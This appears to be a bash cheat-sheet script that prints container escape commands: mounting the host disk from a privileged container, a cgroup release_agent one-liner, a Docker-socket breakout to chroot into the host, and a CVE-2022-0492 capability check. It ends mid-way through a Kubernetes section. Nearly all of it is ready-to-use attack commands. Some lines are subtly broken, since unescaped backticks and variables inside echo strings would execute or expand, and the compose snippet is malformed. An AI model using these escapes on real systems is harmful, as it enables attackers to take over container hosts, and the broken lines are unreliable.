#!/usr/bin/env bash
# Description: Container escape techniques — privileged container, sock mount, cgroups
set -euo pipefail
echo -e "\n=== CONTAINER ESCAPE TECHNIQUES ===\n"
echo "[*] 1. Check if running in container:"
echo "  cat /proc/1/cgroup | grep docker"
echo "  ls /.dockerenv 2>/dev/null && echo 'Container detected'"
echo ""
echo "[*] 2. Privileged container escape (--privileged flag):"
echo "  # Mount host disk:"
echo "  fdisk -l"
echo "  mount /dev/sda1 /mnt && chroot /mnt"
echo "  # Or via cgroups notify_on_release:"
echo "  d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`"
echo "  mkdir -p $d/w; echo 1 >$d/w/notify_on_release"
echo "  t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`"
echo "  touch /o; echo $t/c | tee $d/release_agent"
echo "  echo '#!/bin/sh' >/c; echo 'chroot /mnt /bin/sh' >>/c; chmod +x /c"
echo "  sh -c 'echo 0 >$d/w/cgroup.procs'; sleep 1; cat /o"
echo ""
echo "[*] 3. Docker socket escape (/var/run/docker.sock mounted):"
echo "  # If docker socket is accessible:"
echo "  docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu chroot /host"
echo "  # Or via docker-compose if available:"
echo "  echo 'version:3; services:escape(image:ubuntu,privileged:true,command:chroot /host,volumes:[\"/:/host\"])' | docker-compose -f - up"
echo ""
echo "[*] 4. CVE-2022-0492 (cgroup v1 release_agent):"
echo "  # Exploits cgroup v1 release_agent when CAP_SYS_ADMIN is available"
echo "  # Check capabilities:"
echo "  capsh --print 2>/dev/null || grep Cap /proc/1/status"
echo ""
echo "[*] 5. Kubernetes escape:"
echo "  # Service account token:"
